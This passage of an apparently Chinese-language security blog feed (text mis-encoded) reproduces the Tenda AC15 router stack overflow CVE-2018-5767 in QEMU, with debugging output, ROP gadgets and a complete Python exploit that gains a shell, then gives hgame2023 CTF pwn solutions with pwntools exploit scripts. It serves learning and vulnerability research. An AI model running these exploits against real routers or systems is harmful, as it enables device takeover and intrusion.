</span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>å¢åŠ <code>Cookie</code>å­—æ®µé€è¿‡å»ï¼Œå°è¯•ä½¿è¿›ç¨‹å´©æºƒï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹æœåŠ¡ç«¯ï¼Œå‘ç°ç¨‹åºå‡ºç°äº†æ®µé”™è¯¯ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/179852/7/31724/77375/63cba99fF355a5dc6/221b8aa6cd6408c2.png" style="zoom:80%;" /><ul><li>ä½¿ç”¨<code>gdb-multiarch</code>è°ƒè¯•ç¨‹åºï¼Œåœ¨æ­¤ä¹‹å‰ç°åœ¨å›ºå®šç«¯å£æ‰“å¼€ç¨‹åºï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>å¦å¼€ä¸€ä¸ªçª—å£è¿›è¡Œè°ƒè¯•ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0xfffef87b â—‚â€” stmdbvs r2!, &#123;r1, r2, r3, r5, r8, sb, sl, fp, sp&#125; ^ /* 0x69622f2e; &#x27;./bin/httpd&#x27; */</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0xd2000 â€”â–¸ 0xe520 â—‚â€” push   &#123;r3, lr&#125; /* 0xe92d4008 */</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0xfffef770 â—‚â€” 1</span><br><span class="line"> PC   0xff7e1930 (_start) â—‚â€” mov    r0, sp /* 0xe1a0000d; &#x27;\r&#x27; */</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º 0xff7e1930 &lt;_start&gt;       mov    r0, sp</span><br><span class="line">   0xff7e1934 &lt;_start+4&gt;     bl     #0xff7e4bb4                   &lt;0xff7e4bb4&gt;</span><br><span class="line"> </span><br><span class="line">   0xff7e1938 &lt;_start+8&gt;     mov    r6, r0</span><br><span class="line">   0xff7e193c &lt;_start+12&gt;    ldr    sl, [pc, #0x30]</span><br><span class="line">   0xff7e1940 &lt;_start+16&gt;    add    sl, pc, sl</span><br><span class="line">   0xff7e1944 &lt;_start+20&gt;    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0xff7e1948 &lt;_start+24&gt;    ldr    r4, [sl, r4]</span><br><span class="line">   0xff7e194c &lt;_start+28&gt;    ldr    r1, [sp]</span><br><span class="line">   0xff7e1950 &lt;_start+32&gt;    sub    r1, r1, r4</span><br><span class="line">   0xff7e1954 &lt;_start+36&gt;    add    sp, sp, r4, lsl #2</span><br><span class="line">   0xff7e1958 &lt;_start+40&gt;    add    r2, sp, #4</span><br></pre></td></tr></table></figure><ul><li>æ–­ç‚¹ä¸‹åœ¨<code>End of function R7WebsSecurityHandler</code>å³æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x002ED18</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><ul><li>è€Œåå†æ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œæˆ‘ä»¬ç”¨<code>python</code>çš„<code>requeståº“</code>å°†æ•°æ®ä¼ è¿‡å»ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>ä½†æˆ‘ä»¬æ²¡æœ‰æŒ‰é¢„æœŸè¿”å›ï¼Œè€Œæ˜¯è¢«æŸå­å‡½æ•°å¹²æ‰°äº†ï¼Œ<code>gdb</code>ä¸­åˆ©ç”¨<code>bt</code>å‘½ä»¤æº¯æºä¸€ä¸‹ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><ul><li>åœ¨<code>ida</code>ä¸­æ‰¾åˆ°å¹²æ‰°å‡½æ•°æ‰€åœ¨ä½ç½®ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•é˜²æ­¢ç¨‹åºæ‰§è¡Œæµèµ°åˆ°è¯¥åˆ†æ”¯ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/174764/17/33384/125374/63cbe09cFc920f42f/bb10de241747a44f.png" style="zoom:80%;" /><ul><li>ä¿®æ”¹<code>payload</code>ï¼Œä½¿<code>password</code>åŠ ä¸Š<code>.gif</code>å³å¯ç›´æ¥è¿”å›ï¼Œå¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>+<span class="string">&quot;.gif&quot;</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>é‡å¤ä¸Šè¿°æµç¨‹ï¼Œç¨‹åºæ‰§è¡Œæµæ¥åˆ°æˆ‘ä»¬å‘ç”Ÿçš„åƒåœ¾æ•°æ®ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ°å€æ˜¯<code>0x61616160</code>è€Œé<code>0x61616161</code>ï¼Œè¿™æ˜¯å› ä¸º<code>arm</code>æ¨¡å¼ä¸<code>thumb</code>æ¨¡å¼çš„åˆ‡æ¢é—®é¢˜ã€‚åœ¨å‡½æ•°é€€å‡ºæ—¶æ‰§è¡Œäº†<code>pop pc</code>çš„æ“ä½œï¼Œè€Œå…¶æœ€ä½æœ‰æ•ˆä½(LSB)å°†ä¼šè¢«å†™å…¥åˆ°<code>CPSRå¯„å­˜å™¨</code>(å½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨)çš„Tä½ä¸­ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/52601/34/22749/86724/63cbe317F2b18c959/149ae61d7acf6b6d.png" style="zoom:80%;" /><ul><li>åœ¨æ„é€ <code>ROP</code>é“¾ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ç™½<code>32ä½arm</code>æ¶æ„æ˜¯å¦‚ä½•è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/97649/20/35562/153499/63cbe7d8Ff346c9f7/2d26131e222dfd7a.png" style="zoom:80%;" /><ul><li>æœ¬è´¨å’Œ<code>x86/x64</code>å¤§å·®ä¸å·®ï¼Œç”¨<code>ROPgagdet</code>æ‰¾åˆ°éœ€è¦çš„<code>gadget</code>ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ ROPgadget --binary httpd --only <span class="string">&quot;pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000ec88 : pop &#123;fp, pc&#125;</span><br><span class="line">0x000b06bc : pop &#123;r0, pc&#125;</span><br><span class="line">0x000b0e0c : pop &#123;r1, pc&#125;</span><br><span class="line">0x0000e510 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000e5f0 : pop &#123;r3, r4, fp, pc&#125;</span><br><span class="line">0x0009ffb4 : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x000a0320 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x000a5e30 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0000ec00 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x0009fd10 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0000ed80 : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x000ae530 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000281f4 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x0009fde4 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x0001bff0 : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000a07c4 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x0004aec4 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x000a002c : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x0003cfe8 : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x00090408 : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x000a1e78 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000a5128 : pop &#123;r4, r5, r6, r7, r8, sl, fp, pc&#125;</span><br><span class="line">0x0009fe44 : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0007036c : pop &#123;r4, r6, r7, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 24</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è¿˜çœ‹ä¸æ‡‚ï¼Œæƒ³ç€<code>ret</code>åœ¨å“ªé‡Œï¼Œå¿½ç„¶å‘ç°<code>pop pc</code>å°±æ˜¯<code>ret</code>ã€‚</p><ul><li>è®¡ç®—åç§»ä¸º<code>448</code>ï¼Œæ„é€ æ‰§è¡Œ<code>puts(&quot;ANZA_HACK&quot;)</code>çš„<code>rop</code>é“¾å‘ç°å¤±è´¥ï¼Œä¸éš¾çŒœæµ‹åŸå› æ˜¯<code>sscanf</code>è¢«<code>\x00</code>æˆªæ–­äº†(å› ä¸ºç”¨çš„æºç¨‹åºçš„<code>gadget</code>ï¼Œé«˜ä½ä¸º<code>\x00</code>)ï¼Œæ•…é‡‡ç”¨<code>libc</code>çš„<code>gagdet</code>ï¼Œé¦–å…ˆè¦è®¡ç®—æœ¬åœ°<code>libc</code>åŸºå€ï¼Œæ ¹æ®ä¹‹å‰åœ¨<code>strstr</code>å¤„å‡ºé”™çš„å›¾å¯å¾—ï¼š</li></ul><p><code>æ³¨ï¼šä¸ ctf ä¸­ä¸åŒçš„ä¸€ç‚¹æ˜¯è¿™ç§ web æœåŠ¡åœ¨å´©æºƒåä¸€èˆ¬ä¼šç«‹åˆ»é‡å¯ï¼Œå¹¶ä¸”é‡å¯ä¹‹åçš„ libc åœ°å€å’Œä¹‹å‰æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥çˆ†ç ´ libc æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ”»å‡»æ‰‹æ®µï¼Œä¸è¿‡ qemu æ²¡åŠæ³•æä¾›è¿™ç§çˆ†ç ´ libc çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å…ˆå‡å®šæˆ‘ä»¬çŸ¥é“ libc åŸºå€ã€‚</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&quot;./lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br><span class="line">pop_r0_ret=libc_base+<span class="number">0x0003db80</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr=<span class="number">0xfffeeca8</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">444</span>+<span class="string">&quot;.gif&quot;</span>+p32(pop_r0_ret).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(sh_addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+payload&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>å…¶ä»–åšå®¢çš„ç»“æœéƒ½ä¸èƒ½<code>getshell</code>ã€‚ã€‚ã€‚ã€‚æˆ‘åè€Œå¯ä»¥<code>getshell</code>ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222104/25/16882/304730/63cc009fFb1cef77d/1cf45750308aabda.png" style="zoom:80%;" /><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¾ˆæœ‰æ„æ€çš„ä¸€æ¬¡å®éªŒï¼Œæ¥è§¦äº†å¾ˆå¤šä»¥å‰åªæ˜¯å¬è¿‡ä½†æ˜¯æœªæŠ•å…¥å®è·µçš„çŸ¥è¯†ï¼Œç®—æ˜¯å…¥é—¨æ¼æ´æŒ–æ˜çš„ç¬¬ä¸€æ­¥å§ï¼Œå½“ç„¶è¿˜æœ‰å¾ˆå¤šç»†èŠ‚æ²¡æœ‰ç›˜æ¸…æ¥šï¼Œæœªæ¥è¿˜éœ€åŠªåŠ›ã€‚å†æ¬¡æ„Ÿè°¢åšå®¢å¸ˆå‚…ä»¬ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒç ”æœŸé—´æƒ³å¤ç°çš„æ¼æ´ï¼Œç°åœ¨æŒ–å‡ºæ¥ç›˜ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q&quot;&gt;Tenda-AC15æ ˆæº¢å‡ºæ¼æ´(CVE-2018-5767)    by æ˜ŸæœŸäº”å®éªŒå®¤&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/468018356&quot;&gt;cve-2018-5767 è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´å¤ç°    by åˆå¤©ç½‘å®‰å®éªŒå®¤&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wzt.ac.cn/2019/03/19/CVE-2018-5767/&quot;&gt;CVE-2018-5767 å¤ç°åˆ†æ    by CataLpa&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="cve" scheme="http://example.com/categories/cve/"/>
    
    <category term="cve-2018-5767" scheme="http://example.com/categories/cve/cve-2018-5767/"/>
    
    
    <category term="cve tenda" scheme="http://example.com/tags/cve-tenda/"/>
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="http://example.com/2023/01/05/hgame2023/"/>
    <id>http://example.com/2023/01/05/hgame2023/</id>
    <published>2023-01-05T12:06:14.000Z</published>
    <updated>2023-02-01T14:02:32.950Z</updated>
    
    <content type="html"><![CDATA[<p>å¤å¥ã€‚</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>ç¡®å®<code>easy</code>ï¼Œç›´æ¥æ„é€ æ ˆæº¢å‡ºå³å¯ï¼Œè¦æ³¨æ„åé—¨å‡½æ•°åœ°å€+1ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png" style="zoom:80%;" /><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">backdoor=<span class="number">0x40117b</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)*<span class="number">10</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>shell</code>åè¿›è¡Œä¸€æ³¢é‡å®šä½å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>å…¸å‹çš„è´Ÿæ•´æ•°è¶Šç•Œåˆ©ç”¨ï¼Œç”±æœªæ£€æŸ¥ä¸‹ç•Œå¯¼è‡´ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png" style="zoom:80%;" /><ul><li>æ¼æ´å…è®¸æˆ‘ä»¬æ›´æ”¹ä¸‹æ ‡æŒ‡å‘<code>0x10</code>å†…å®¹ï¼Œä¸”ç¨‹åºå¯åŠ«æŒ<code>got</code>è¡¨ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€æ­¥ï¼ŒåŠ«æŒ<code>exit</code>ä¸º<code>vuln</code>å‡½æ•°ã€‚</li><li>ç¬¬äºŒæ­¥ï¼Œæ³„éœ²ä»»æ„ä¸€å¤„<code>got</code>è¡¨åœ°å€ï¼Œå³æ³„éœ²<code>libc</code>ã€‚</li><li>ç¬¬ä¸‰æ­¥ï¼ŒåŠ«æŒ<code>puts</code>ä¸º<code>system</code>ï¼Œé¡ºä¾¿å†™å…¥<code>/bin/sh</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png" style="zoom:80%;" /><ul><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">32413</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">vul=<span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,p64(vul))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>è›®æœ‰æ„æ€çš„ä¸€é“<code>orw</code>é¢˜ï¼Œå·©å›ºäº†ä¸€äº›çŸ¥è¯†ç‚¹ã€‚</p><img 